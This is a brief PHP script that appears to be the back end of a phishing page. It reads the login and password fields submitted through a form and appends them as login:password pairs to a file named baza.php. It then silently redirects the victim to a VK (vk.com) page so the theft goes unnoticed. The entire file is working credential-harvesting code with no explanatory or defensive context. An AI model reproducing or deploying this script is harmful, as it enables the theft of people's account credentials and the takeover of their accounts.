<?PHP
$Log = $_POST['login'];
$Pass = $_POST['pass'];
$log = fopen("baza.php","at");
fwrite($log,"$Log:$Pass\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/votes4all'></head></html>";
?>